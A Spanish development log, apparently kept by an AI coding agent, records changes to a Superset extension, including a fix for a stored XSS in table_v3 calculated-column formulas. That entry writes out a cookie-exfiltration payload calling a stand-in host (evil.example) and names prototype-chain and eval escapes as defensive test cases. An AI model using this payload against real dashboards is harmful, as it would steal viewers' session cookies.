Por último, el usuario reportó que "en los CSS y HTML los entrega desordenados" — el modelo SIEMPRE entrega `styleTemplate`/`handlebarsTemplate` minificados en una sola línea, lo que hace casi imposible revisarlos a ojo en la tarjeta de diff (y, como se vio con el bug de rgba(), dificulta encontrar errores de sintaxis). Se agregó un formateador propio (sin dependencia nueva) para la tarjeta de "Ver cambio".

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_viz_controls_core.py` (advertencia de `rgba()`/`rgb()` en las 3 descripciones que permiten escribir CSS: `styleTemplate` de html_cards, `column_config` de table_v3 y de pivot_table_rx1)
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_viz_controls_core.py` (+1 test que falla si alguna de las 3 pierde la advertencia)
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/codeFormat.ts` (nuevo) — `formatCss`/`formatHtml` propios: indentación por profundidad de llaves (CSS, preservando contenido de strings con llaves literales) o por apertura/cierre de tags HTML y bloques Handlebars `{{#if}}/{{else}}/{{/if}}`/`{{#each}}` (HTML), sin tocar el contenido real (ni arregla bugs como el de rgba(), ni cambia lo que se aplica/guarda — es solo para LECTURA en el diff)
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx` (`ControlDiffRow` usa `formatCodeForDiff` + un `CodeBlock` con scroll propio para `styleTemplate`/`handlebarsTemplate`; cualquier otro control sigue el resumen legible de siempre, sin cambios)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/codeFormat.test.ts` (nuevo, 19 tests)

Que cambia o corrige:
- Las 3 descripciones CSS advierten: "rgba()/rgb(): coma entre canales y alfa... NUNCA rgba(99 245 200,.18) (inválido, se descarta sin error visible, bug real y recurrente del modelo)" — mismo criterio que el resto de este catálogo (advertir sobre bugs REALES y confirmados, no hipotéticos).
- La tarjeta de "Ver cambio" ahora muestra `styleTemplate`/`handlebarsTemplate` en un bloque `<pre>` con scroll propio, indentado y legible, en vez de todo el texto crudo en una sola línea envuelta dentro de un `<span>` — probado contra el CSS real (roto) del slice 54: se indenta correctamente, sin romper el contenido, y el bug de `rgba()` queda incluso MÁS visible (cada declaración en su propia línea) en vez de perdido en medio de una sola línea de miles de caracteres.

Verificacion:
- 367/367 backend (1 test nuevo).
- 352/352 frontend (19 tests nuevos de `codeFormat.test.ts` — incluye casos con `@media`/`@container` anidados, strings con llaves literales, `{{#each}}` anidado con HTML adentro, atributos con `>` dentro de comillas, elementos vacíos/autocerrados). `tsc --noEmit` limpio.
- Probado además, fuera de la suite de tests (sanity check manual, no comiteado), con el CSS real de 7016 caracteres del slice 54 (el mismo con el bug de rgba()): se formatea sin excepciones, llaves balanceadas, una propiedad por línea, perfectamente legible.
- `build-extension.sh` completo, `.supx` reconstruido y copiado a `extensions_test/`.
- Pendiente: el usuario reinicie `superset_mcp_test.service` (mismo problema de `sudo` no interactivo recurrente en esta sesión).

### 2026-09-29 (vulnerabilidad real: XSS vía calculated_columns — ejecución de JS arbitrario en el navegador)

Cambio realizado:
Mientras se preparaba una respuesta sobre "JS más dinámico pero seguro" para html_cards (pedido del usuario en `explore-d74efaf6...`), se encontró y confirmó una vulnerabilidad de seguridad REAL en `calculated_columns` de `table_v3`. `buildJsExpression` (`calculatedColumns.ts`) solo traduce nombres ALL-CAPS conocidos (`IF`, `OR`, `AND`, `NOT`, `ISBLANK`, `ABS`, `ROUND`, `MAX`, `MIN`, `TRUE`, `FALSE`, `NULL`, `NAN`) y deja pasar CUALQUIER otro identificador intacto hasta `new Function(...)` — que NO aísla del scope global del navegador (solo controla los parámetros nombrados explícitos). Una fórmula sin ninguna palabra en mayúsculas, ej. `(1, fetch('https://evil.example/steal?c=' + document.cookie))`, compilaba SIN ERROR y EJECUTABA de verdad con acceso real a `document`/`window`/`fetch` — confirmado con un repro Node.js standalone simulando esos globals. Impacto: **Stored XSS real** — cualquier usuario con permiso de editar un gráfico `table_v3` podía inyectar la fórmula, y corría en el navegador de cualquiera que viera ese gráfico (incluido en dashboards compartidos, con las cookies de sesión de esa persona). `irex.validate_calculated_column_formula` tampoco lo detectaba (mismo filtro solo-ALL-CAPS, `extract_unknown_function_tokens` original). El usuario autorizó corregirlo de inmediato como prioridad ("Adelante"), antes de seguir con el diseño de JS dinámico.

Archivos afectados:
- `custom-plugins/plugin-chart-tableV3/src/utils/calculatedColumns.ts` — nueva `findDisallowedIdentifier()` (allowlist ESTRICTA: escanea `resolved` fuera de literales de string, byte a byte, y rechaza cualquier identificador que no sea uno de los helpers internos/getters/literales conocidos) llamada al final de `buildJsExpression`; si encuentra uno, la fórmula entera se rechaza (`return null`, mismo camino que cualquier fórmula inválida hoy — el evaluador queda en `() => null`, cacheado).
- `custom-plugins/plugin-chart-tableV3/test/calculatedColumns.test.ts` — 6 tests nuevos (`describe('security: ...')`): bloquea el payload real de exfiltración (con `jest.fn` espiando `fetch`, confirma que NUNCA se llama), bloquea `window`/`document` sueltos, bloquea fuga por cadena de prototipos (`total.constructor.constructor(...)`), bloquea `eval` directo, confirma que fórmulas legítimas reales siguen compilando igual, confirma que un identificador DENTRO de un string literal no se marca por error.
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_calculated_column_core.py` — `extract_unknown_function_tokens` generalizado de "solo ALL-CAPS" a CUALQUIER identificador (nueva `_IDENTIFIER_RE`, nueva `_mask_string_literals` para no confundir contenido de strings con código); ahora recibe `known_names` opcional para replicar la asimetría real del compilador (`scope.{{Nombre}}` siempre se consume, `scope.Nombre` sin llaves SOLO si `Nombre` resuelve a una columna real — si no, el `total`/`col`/`row` del principio queda sin enmascarar y se detecta en el escaneo).
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/validate_calculated_column_formula.py` — descripción del tool ampliada explicando el rechazo por identificador desconocido.
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_calculated_column_core.py` — 7 tests nuevos (`TestExtractUnknownFunctionTokensSecurity`, `TestFormulaValidationResultSecurity`): mismos casos que el lado frontend, portados al validador.
- `docs/explore-assistant-contract.md` — sección nueva bajo `irex.validate_calculated_column_formula` documentando el hallazgo y la corrección.

Que cambia o corrige:
- Se pasa de un modelo "blocklist" (traducir lo conocido, dejar pasar lo demás) a uno "allowlist estricta" (traducir lo conocido, RECHAZAR cualquier otra cosa) en AMBOS lados — el compilador real (la barrera efectiva, en el navegador) y el validador MCP (para que el modelo reciba `valid:false` con motivo en vez de que la fórmula silenciosamente no haga nada, o antes de este fix, ejecutara código real).
- Fórmulas legítimas (incluida la del caso real `IF(OR(ISBLANK(total.{{Sell In}}), total.{{Sell In}} = 0), 0, {{Sell In}} / total.{{Sell In}})`) siguen compilando y validando exactamente igual que antes — verificado explícitamente.

Verificacion:
- Frontend: lógica verificada con un harness Node standalone (`tsc` compilando el archivo real a JS, sin mocks de la lógica) simulando `fetch`/`document`/`window` globales — 5 payloads de ataque bloqueados (comma+fetch, window suelto, cadena de prototipos vía `total`, `eval` directo, `document.cookie` sin fetch) y 5 fórmulas legítimas reales siguen calculando el mismo resultado que antes.
- Backend: 46/46 tests de `test_explore_calculated_column_core.py` (7 nuevos), 374/374 de toda la suite del backend de la extensión.
- `build-extension.sh` completo (pytest + webpack + `.supx` reconstruido desde cero) copiado a `extensions_test/` — `superset_mcp_test.service` reiniciado y confirmado corriendo desde las 10:22:00 (proceso nuevo, verificado con `ps -o lstart`).
- **Hallazgo de infraestructura relevante para el deploy**: a diferencia de la extensión MCP (`extensions/` vs `extensions_test/`, aislados), el fix del COMPILADOR (la barrera real) vive en un plugin de chart cuyo build compilado (`superset/static/assets/`) está en `superset_v6_1_0/superset/`, el MISMO `SUPERSET_DIR` que usan `superset.service` (prod) y `superset_test.service` (test) — confirmado en `.env_superset`/`.env_superset_test`. No hay forma de probar este fix "solo en test": `npm run build` + reiniciar cualquiera de los dos servicios lo pone en producción de inmediato. Se consultó al usuario explícitamente antes de correr el build por esta razón (eligió "reconstruir y desplegar ahora", dada la severidad). `npm run build` completo (webpack, sin errores — 2 warnings no relacionados), `superset_test.service` reiniciado y confirmado corriendo desde las 10:22:00 con el manifest/chunk del plugin regenerado (hash de contenido nuevo, confirmando que el cambio de código SÍ se compiló). **Pendiente de autorización explícita**: reiniciar `superset.service` (producción) para que el mismo build (ya en disco, compartido) tome efecto ahí — hasta ese reinicio, prod sigue sirviendo el bundle VIEJO y vulnerable.
- Deploy completo (usuario reinició manualmente): `superset.service` desde 10:24:12, `superset_mcp.service` desde 10:22:18 (validador viejo) y luego 10:32:54 tras rebuildear el `.supx` apuntando a `extensions/` — el fix quedó activo en producción de punta a punta (frontend + backend MCP), confirmado con `ps -o lstart` en cada reinicio.

### 2026-09-29 (html_cards: interactividad declarativa sin JS — generaliza data-hc-sort/data-hc-resize)

Cambio realizado:
Continuación directa de la sesión `explore-d74efaf6...` ("siento que el no uso de js me limita en algunas posibilidades, que opción hay que sea segura para implementar un js seguro?") y del hallazgo de seguridad de `calculated_columns` de la misma jornada: en vez de dejar que el modelo escriba JS libre (inseguro, ver hallazgo de arriba) o seguir el patrón de "un atributo `data-hc-*` hardcodeado por comportamiento, requiere editar el plugin cada vez" (limitado, exactamente lo que el usuario pidió generalizar: "cada vez que quiera agregar un comportamiento js debo editar el plugin y documentar... busco algo más dinámico pero sin que llegue a ser inseguro"), se generalizó el patrón YA usado por `data-hc-sort`/`data-hc-resize` a un vocabulario declarativo genérico de acciones.

Al revisar `HandlebarsViewer.tsx` para diseñar esto se encontró un hallazgo relevante: `sanitizeHtmlIfNeeded` solo corre si `HTML_SANITIZATION` está activo, y está en `False` en esta instalación (test y prod) — es decir, `handlebarsTemplate` YA renderiza HTML/JS inline SIN sanitizar (a diferencia de `calculated_columns`, acá no hace falta ningún bug de compilador: un `<script>`/`onClick=` inline en la plantilla ya ejecutaría hoy). El vocabulario declarativo no es una barrera técnica nueva sobre eso — es la alternativa seria que el modelo debería preferir siempre en vez de HTML/JS crudo, y así quedó documentado explícitamente para que lo sepa.

Archivos afectados:
- `custom-plugins/plugin-chart-html-cards/src/utils/dynamicActions.ts` (nuevo) — `initDynamicActions(container)`: escanea `[data-hc-on][data-hc-action]`, engancha el evento declarado (allowlist: click/dblclick/mouseenter/mouseleave/change/submit) y despacha a un registro fijo `ACTIONS` (`toggleClass`/`addClass`/`removeClass`, `toggleAttr`, `scrollTo`, `setStyleVar`, `copyText`, `countUp`) — `parseActions()` usa solo `split()`/`trim()`, nunca `eval()`/`new Function()` sobre lo que escribe el modelo. `data-hc-target="selector"` opcional aplica la acción a OTRO elemento del mismo gráfico (scoped al `container`, nunca `document.querySelector` global). Devuelve función de limpieza, mismo contrato que `initTableInteractions`.
- `custom-plugins/plugin-chart-html-cards/src/components/Handlebars/HandlebarsViewer.tsx` — engancha `initDynamicActions` en el mismo `useLayoutEffect` que `initTableInteractions`, cleanup combinado.
- `custom-plugins/plugin-chart-html-cards/src/HtmlCards.tsx` — CSS `cursor: pointer` para `[data-hc-on="click"/"dblclick"]`.
- `custom-plugins/plugin-chart-html-cards/src/plugin/controls/handlebarTemplate.tsx` — tooltip de ayuda de la UI gana dos entradas: `data-hc-sort / data-hc-resize` (existían desde antes pero NUNCA se habían documentado en ningún lado — pendiente de una sesión previa, "Si documenta") y `data-hc-on / data-hc-action / data-hc-target`.
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_viz_controls_core.py` — nueva `_HTML_CARDS_INTERACTIVITY_HELP`, expuesta como campo `note` de nivel superior en la respuesta de `irex.get_viz_controls(viz_type="html_cards")` (junto a `controls`/`source`/`control_info`) — NO cupo dentro de `control_info.handlebarsTemplate.description` (ya en 1977/2000 caracteres) ni `styleTemplate` (1991/2000), así que viaja en un campo separado no sujeto a ese límite. Documenta el vocabulario completo, los eventos permitidos, un ejemplo, y la advertencia sobre `HTML_SANITIZATION`/`<script>` de arriba.
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_viz_controls_core.py` — tests nuevos: `note` presente solo para `html_cards` (no para table_v3/pivot_table_rx1), cruce contra el registro `ACTIONS` REAL de `dynamicActions.ts` (si se agrega una acción al plugin sin documentarla acá, falla), cruce contra `ALLOWED_EVENTS` real, advertencia de `HTML_SANITIZATION`/`<script>` presente; más el ajuste del test cruzado tooltip↔control_info para que también busque en `note`.
- `custom-plugins/plugin-chart-html-cards/src/__tests__/dynamicActions.test.ts` (nuevo, 12 tests) — no ejecutable vía `npm run test` (mismo hueco de siempre: `testRegex` de `jest.config.js` exige el path literal `/superset-frontend/(spec|src|plugins|packages|tools)/`, y el crawler de Jest no sigue el symlink `superset-frontend/plugins/plugin-chart-html-cards` → `custom-plugins/`, confirmado explícitamente esta vez con `--testPathPattern` apuntando al path simlinkeado: "0 matches" de 3616 archivos revisados).

Que cambia o corrige:
- El modelo ahora puede componer comportamiento interactivo (toggle de clases, scroll, copiar al portapapeles, animar un contador, fijar una variable CSS) escribiendo solo atributos HTML declarativos en `handlebarsTemplate` — sin tocar el plugin ni pedir un cambio de código cada vez, y sin la superficie de riesgo de JS libre.
- Responde también la pregunta pendiente "la animación del texto, eso no es posible?" (sesión `explore-d74efaf6...`): `countUp:valorDestino,duraciónMs` anima el propio texto numérico del elemento.
- `data-hc-sort`/`data-hc-resize` (funcionalidad preexistente, nunca documentada) quedan documentados por primera vez, tanto en la UI como para el modelo.

Verificacion:
- Frontend: 20/20 casos verificados con un harness Node standalone (mock de DOM mínimo propio, sin jsdom — jsdom choca con un `require()` de ESM en Node 18.19.1 de este entorno) compilando `dynamicActions.ts` real vía `tsc`: toggleClass agrega/quita, `data-hc-target` afecta a OTRO elemento y no al que disparó el evento, varias acciones encadenadas con `;`, evento fuera de la allowlist no engancha nada, acción desconocida no rompe el resto de la cadena (con warning), `dispose()` remueve el listener, `setStyleVar` antepone `--`, `copyText` lee `data-hc-copy-value`, selector inválido en `data-hc-target` no rompe el render (cae al propio elemento), `countUp` termina en el valor destino.
- Backend: 55/55 de `test_explore_viz_controls_core.py` (7 nuevos/ajustados), 377/377 de toda la suite del backend de la extensión.
- `build-extension.sh` completo copiado a `extensions_test/`; `npm run build` completo (webpack, sin errores nuevos). Reiniciados manualmente por el usuario `superset_mcp_test.service`/`superset_test.service` (confirmado con `ps -o lstart`, procesos nuevos desde las 10:48:40).

### 2026-09-29 (html_cards: evento `load` + sufijo en `countUp` — hallazgo de uso real, no hipotético)

Cambio realizado:
Primera prueba real del vocabulario de la entrada anterior (sesión `explore-da9c3d25...`, `slice_id: 54`, `viz_type: html_cards`): el usuario pidió animar el número de porcentaje al cargar la tarjeta. El log confirma que `irex.get_viz_controls(viz_type="html_cards")` SÍ se llamó (`explore_control_catalog_checked`, `source: specific`, `control_count: 15`) y que el campo `note` nuevo SÍ llegó al modelo — su respuesta cita correctamente que `countUp` "es una acción disparada por eventos" y que "no documenta un disparador al cargar". El modelo, correctamente, NO propuso ningún cambio en vez de forzar algo con lo que no contaba ("Por eso no propongo un cambio... No he verificado el renderizado del gráfico") — comportamiento seguro, no un bug del modelo. Pero identificó dos huecos reales del diseño: (1) `ALLOWED_EVENTS` solo tenía eventos de interacción, ninguno para "al renderizarse"; (2) `countUp` reemplaza todo el `textContent`, perdiendo cualquier sufijo como "%" que ya estuviera ahí. Confirmado ambos con el usuario por `AskUserQuestion`, autorizado agregar los dos.

Archivos afectados:
- `custom-plugins/plugin-chart-html-cards/src/utils/dynamicActions.ts` — `ALLOWED_EVENTS` gana `'load'` (sintético: sin `addEventListener`, la acción corre inmediatamente al escanear el elemento en `initDynamicActions`, y de nuevo en cada re-render). `countUp` gana un 3er argumento opcional (sufijo, ej. `countUp:45,1200,%`), agregado al final del `textContent` animado.
- `custom-plugins/plugin-chart-html-cards/src/__tests__/dynamicActions.test.ts` — 3 tests nuevos (load corre inmediato sin evento, load se re-dispara en cada init, countUp con sufijo).
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_viz_controls_core.py` — `_HTML_CARDS_INTERACTIVITY_HELP` documenta `load` (con la aclaración de que se re-dispara en cada render) y `countUp:valorDestino,duraciónMs,sufijo`, más un ejemplo de animación al cargar.
- `custom-plugins/plugin-chart-html-cards/src/plugin/controls/handlebarTemplate.tsx` — tooltip de la UI actualizado igual.
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_viz_controls_core.py` — el test que cruza `note` contra `ALLOWED_EVENTS` real ahora incluye `load` en el set esperado (ya lo detectaba automáticamente vía regex contra el archivo fuente; solo hacía falta ajustar la aserción de la lista completa).

Que cambia o corrige:
- El modelo ahora puede animar un número apenas se renderiza la tarjeta (`data-hc-on="load"`) sin esperar ninguna interacción del usuario, y puede mantener un sufijo como "%" o una unidad durante la animación — exactamente el caso que bloqueó la sesión real.

Verificacion:
- Frontend: 23/23 casos con el mismo harness Node standalone (3 nuevos: load corre sin evento, load se re-dispara en cada init con toggle, countUp con sufijo "%" disparado por load).
- Backend: 377/377 (test de ALLOWED_EVENTS ajustado, sigue derivando la lista real del archivo fuente vía regex — no una copia a mano).
- `build-extension.sh` completo a `extensions_test/`; `npm run build` en curso al momento de este registro.

### 2026-09-29 (composer de Explore: "Mejorar gráfico" pasa a ser el modo por defecto; "Explicar"/"Métricas" se acceden con /)

Cambio realizado:
Mientras se revisaban sesiones reales de html_cards, el usuario señaló que el selector de 3 modos (Explicar/Mejorar gráfico/Métricas), siempre visible arriba del composer, confunde — varias de las sesiones revisadas terminaron sin ninguna propuesta simplemente porque el usuario (sin darse cuenta) tenía seleccionado "Explicar" en vez de "Mejorar gráfico" (ver sesión `explore-8324ad60...`, donde el modelo evaluó factibilidad correctamente en modo `explain` pero nunca iba a proponer un patch, por diseño de ese modo). Pedido del usuario: "el modo por defecto debe ser el de Mejorar gráfico, los demás modos se podrían acceder usando el comando /".

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/slashCommands.ts` — `SLASH_COMMANDS` gana `explain` y `metrics`.
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreConversation.tsx` — se eliminó `ExploreSegmentedControl`/`EXPLORE_MODE_OPTIONS` (el selector de 3 botones) y el prop `onModeChange`; el texto de estado vacío ahora menciona `/explain`/`/metrics` en vez de "elegí una acción abajo".
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx` — el modo por defecto (montaje inicial, "Nueva sesión", fallback de `/resume` con un modo desconocido) pasa de `'explain'` a `'improve_chart'`. `handleSend` gana un 2º parámetro opcional `overrideMode` (no depende de `setMode`, que es asíncrono — evita el problema clásico de leer el modo viejo en el mismo tick). `handleCommand` enruta `/explain`/`/metrics` a `handleSend(texto, modo)` — ESE turno usa el modo pedido; el modo por defecto para los turnos siguientes NO cambia (a diferencia del viejo selector, que era una elección persistente).
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/ExploreAssistantPanel.test.tsx` — 2 tests reescritos (default ahora `improve_chart`; el viejo test de "click en el radio Mejorar gráfico" se reemplaza por `/explain` y `/metrics`, este último verificando explícitamente que el modo por defecto sigue siendo `improve_chart` en el turno SIGUIENTE) + 1 test de `/resume` corregido (el historial grabado ahora empieza con el prompt de `improve_chart`, no el de `explain`).
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/slashCommands.test.ts` — 2 tests nuevos (registro incluye explain/metrics; ambos parsean bien con y sin argumentos).

Que cambia o corrige:
- Ya no hay forma de "quedarse pegado" en un modo no deseado sin darse cuenta — "Mejorar gráfico" es siempre el default, y pedir explícitamente otra cosa (`/explain`, `/metrics`) es una acción consciente de un solo turno, no un estado persistente que hay que recordar cambiar de vuelta.
- No afecta el contrato con el backend del chat — los 3 valores de `mode` (`explain`/`improve_chart`/`metrics`) siguen siendo exactamente los mismos en el request; solo cambió CÓMO el frontend del widget decide cuál mandar.

Verificacion:
- Esta parte del proyecto vive enteramente en `custom-extensions/irex-mcp-tools/frontend/` (build propio vía `build-extension.sh`, aislado en `extensions_test/`/`extensions/`) — a diferencia de los cambios de plugins de chart de hoy, NO comparte build con `superset-frontend`, así que este cambio SÍ se pudo probar solo en test sin afectar producción.
- 354/354 tests frontend de la extensión (5 nuevos/reescritos). `tsc --noEmit` limpio.
- `build-extension.sh` completo, `.supx` reconstruido y copiado a `extensions_test/`. Pendiente que el usuario reinicie `superset_mcp_test.service`.

### 2026-09-29 (revisión visual: "ojos" para el LLM — backend de la captura de pantalla, primera mitad)

Cambio realizado:
Propuesta del usuario, ya coordinada con el backend del chat: darle al modelo la posibilidad de pedir una captura del gráfico YA RENDERIZADO (después de aplicar un cambio) para revisar layout/superposición/colores — motivado directamente por el bug de `orderby` de la entrada anterior (el modelo nunca ve el gráfico, solo propone texto). El backend confirmó: (1) los modelos aceptan imágenes pero el campo `images` de un tool_result HOY se convierte a texto (`extract_text`) antes de llegar al modelo — van a adaptar Explore para pasarlo como `input_image` al mismo asistente; (2) la captura debe subirse y confirmarse ANTES de mandar el mensaje del usuario (el MCP no puede pedirle al navegador que capture en el momento); (3) JPG, límite de tamaño, `capture_id` propio (no alcanza con `form_data_key`, puede haber varias capturas); (4) no van a subir los límites de turnos/herramientas todavía, medir primero en test.

Investigación previa a escribir código: los caches de Superset no sirven para esto — `cache_manager.cache` es `NullCache` en `superset_config_test.py` (probarlo en test sería un placebo), `explore_form_data_cache` es real en ambos entornos pero pensado para JSON chico en la base de metadata, no para binarios. Como el endpoint de subida (proceso de `superset.service`) y la tool MCP que la lee (proceso de `superset_mcp.service`) son procesos DISTINTOS mismo host, se optó por disco compartido — sin depender de qué cache esté configurada en cada entorno.

Archivos afectados (backend, primera mitad — falta el lado del widget):
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/chart_screenshot_store.py` (nuevo) — `save_screenshot`/`read_screenshot`, disco compartido bajo `IREX_CHART_SCREENSHOT_DIR` (default `/tmp/irex-chart-screenshots`), `capture_id` opaco (`secrets.token_urlsafe`), TTL 10 minutos, límite 3 MB, dueño verificado por username, limpieza de vencidos en cada acceso.
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/chart_screenshot_api.py` (nuevo) — `POST /extensions/irex/irex-mcp-tools/chart-screenshots/upload`, mismo patrón de permisos que `assistant_api.py` (vista con nombre propio, nunca `class_permission_name` de un tipo del host — ver su docstring sobre por qué eso borra permisos reales; `can_explore`/Superset + `can_read`/Chart+Dataset + acceso al dataset declarado; `csrf_exempt = False` explícito).
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/chart_screenshot_core.py` (nuevo) — núcleo puro de la tool, sin el decorador `@tool` (mismo patrón que el resto: `_core.py` se puede importar con pytest normal, el wrapper `@tool` no).
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/get_chart_screenshot.py` (nuevo) — tool MCP `irex.get_chart_screenshot(capture_id)`, wrapper delgado sobre el core; devuelve `[metadata, Image(jpeg)]` (`fastmcp.utilities.types.Image`, produce un bloque `ImageContent` real del protocolo MCP) o `{"error": "not_found", ...}` sin crashear si venció/no existe/es de otro usuario.
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/entrypoint.py` — registra `chart_screenshot_api` (con el mismo try/except que `assistant_api`, un fallo ahí no debe tumbar las tools) y `get_chart_screenshot`.
- `superset_config_test.py` — paso 6 de CLAUDE.md aplicado (`always_visible`); `get_chart_screenshot` excluido de `MCP_RESPONSE_SIZE_CONFIG` (el guard de tamaño solo sabe truncar strings a 500 caracteres, corrompería la imagen — el límite real de 3 MB ya lo aplica el store antes de guardar).
- Tests nuevos: `test_chart_screenshot_store.py` (7) y `test_get_chart_screenshot.py` (4) — guardar/leer con el mismo dueño, otro usuario no puede leer, capture_id inexistente/vencido da `None` sin romper, imagen demasiado grande se rechaza sin guardar nada, un capture_id con `../` no escapa el directorio. `chart_screenshot_api.py` (la vista Flask) no se prueba con pytest, mismo criterio que `assistant_api.py` — se prueba contra el Superset de test real.

Que cambia o corrige:
- Sienta la base del lado del backend/MCP para que el modelo pueda pedir y recibir una captura real del gráfico ya renderizado. Falta la mitad del widget (captura client-side con `dom-to-image-more`, subida, UI de "Solicitar revisión visual" después de aplicar un cambio) — próxima entrada.

Verificacion:
- 388/388 backend (11 tests nuevos).
- `build-extension.sh` completo, `.supx` reconstruido y copiado a `extensions_test/` (confirmados los 4 archivos nuevos empaquetados). Pendiente que el usuario reinicie `superset_mcp_test.service` Y `superset_test.service` (el endpoint de subida vive en ESE proceso, no en el MCP).

### 2026-09-29 (revisión visual: "ojos" para el LLM — widget, segunda mitad)

Cambio realizado:
Continuación directa de la entrada anterior — el lado del widget: captura client-side, subida, y la UI de "Solicitar revisión visual". Ubicación de la UI, a pedido explícito del usuario: "después de que el LLM responde y yo aplico el cambio, básicamente aparece después que se aplicó el cambio y el gráfico se renderizó" — mismo momento y mismo mecanismo de vigencia que el aviso de "Deshacer" (`readPendingUndo`), no un botón nuevo siempre visible. El aviso de no-determinismo de `orderby` (hallazgo de la entrada de hoy anterior) se documentó en la descripción de la tool, a pedido del usuario ("en la respuesta del modelo, vía prompt"), no como texto fijo de la UI.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/package.json` — nueva dependencia `dom-to-image-more` (misma librería y versión base que usa "Exportar a imagen" de Explore, `superset-frontend/src/utils/downloadAsImage.tsx` — no una implementación propia).
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/chartScreenshotAdapter.ts` (nuevo) — `captureChartScreenshot()`: captura `.panel-body .chart-container` (el MISMO selector que usa "Exportar a imagen" real, `useExploreAdditionalActionsMenu/index.tsx` — no inventado, ya confirmado que apunta al lugar correcto), ancho tope 1600px vía `scale`, calidad JPEG 0.85, conversión data-URL→Blob manual (sin pasar por `fetch()`, más simple de probar). `uploadChartScreenshot()`: `POST` multipart a `/extensions/irex/irex-mcp-tools/chart-screenshots/upload`, CSRF vía `authentication.getCSRFToken()` (mismo patrón que `exploreApplyAdapter.ts`), devuelve el `capture_id`.
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx` — nuevo componente `ExploreVisualReviewPrompt` (mismo patrón que `ExploreUndoBanner`: lee `readPendingUndo` de forma independiente, no comparten estado) — botón chico → textarea de detalle (opcional) + "Enviar"/"Cancelar". Nuevo `handleVisualReview`: captura → sube → RECIÉN entonces `handleSend` con un mensaje que incluye el `capture_id` en texto plano (`"Revisión visual solicitada (capture_id: xxx). <detalle>"`) — orden estricto acordado con el backend del chat. Un error de captura/subida se muestra en la tarjeta y NO cierra ni manda nada (se puede reintentar sin perder el detalle ya escrito); un envío exitoso cierra la tarjeta sola.
- Tests nuevos: `chartScreenshotAdapter.test.ts` (7 — sin contenedor rechaza, con contenedor llama a `domToImage.toJpeg` y devuelve Blob JPEG, multipart con los campos correctos y CSRF, `sliceId: null` no manda ese campo, error con/sin cuerpo JSON, `capture_id` inválido se rechaza) + 7 en `ExploreAssistantPanel.test.tsx` (sin cambio aplicado no se ofrece; con cambio aplicado aparece y se puede expandir; capturar→subir→mandar en ese orden con el `capture_id` correcto en el mensaje; sin detalle no agrega texto extra; error de captura/subida se muestra y NO manda nada, se puede reintentar; "Cancelar" no captura ni sube nada).

Que cambia o corrige:
- El usuario ya puede pedirle al modelo que revise visualmente el resultado de un cambio recién aplicado, con un detalle opcional de qué no le gustó — cierra el círculo completo (backend+widget) de la propuesta original.

Verificacion:
- 368/368 frontend (14 tests nuevos: 7 del adapter + 7 de integración en el panel). `tsc --noEmit` limpio.
- `build-extension.sh` completo (pytest + webpack + `.supx` reconstruido desde cero) copiado a `extensions_test/` — nuevo chunk separado para `dom-to-image-more` confirmado en el build. Pendiente que el usuario reinicie `superset_mcp_test.service` Y `superset_test.service`.
- **Pendiente, fuera de este repo**: el backend del chat todavía tiene que adaptar Explore para pasar el bloque `images` del tool_result como `input_image` al modelo (confirmado que hoy se convierte a texto vía `extract_text` y se pierde) — sin eso, el flujo de subida funciona pero el modelo no "ve" la imagen todavía. Informe completo armado para el otro agente, próximo mensaje.

### 2026-09-30 (fix real: `get_chart_screenshot` caía en el guard de tamaño pese a estar "excluido" — nombre corto vs. namespace completo)

Cambio realizado:
El usuario probó el flujo completo contra el LLM real y confirmó que funciona — el otro agente reportó por separado un error real en esa misma prueba: `irex.get_chart_screenshot` devolvía `"Error: Response too large: ~82,743 tokens (limit: 25,000)"` en vez de la imagen, pese a que `get_chart_screenshot` ya estaba en `MCP_RESPONSE_SIZE_CONFIG["excluded_tools"]`. Causa raíz confirmada leyendo `superset/mcp_service/middleware.py::ResponseSizeGuardMiddleware.on_call_tool`: compara `excluded_tools` contra `tool_name = getattr(context.message, "name", ...)` — para un tool NATIVO de Superset (`get_chart_info`) ese nombre es corto, pero para un tool de la EXTENSIÓN es el namespace completo (`extensions.irex.irex-mcp-tools.irex.<nombre>`, igual que en `always_visible`). Había usado el nombre corto (`"get_chart_screenshot"`) en `excluded_tools` — nunca coincidía, así que el guard se aplicaba igual. `always_visible` (mismo archivo) ya tenía el nombre completo correcto — la inconsistencia entre las dos listas fue el error.

Archivos afectados:
- `superset_config_test.py` — `excluded_tools` corregido a `"extensions.irex.irex-mcp-tools.irex.get_chart_screenshot"`, con comentario explicando la trampa para no repetirla con el próximo tool de extensión que necesite excluirse.

Que cambia o corrige:
- `irex.get_chart_screenshot` ahora sí bypassa el guard de tamaño y devuelve la imagen completa, en vez de un error de texto.

Verificacion:
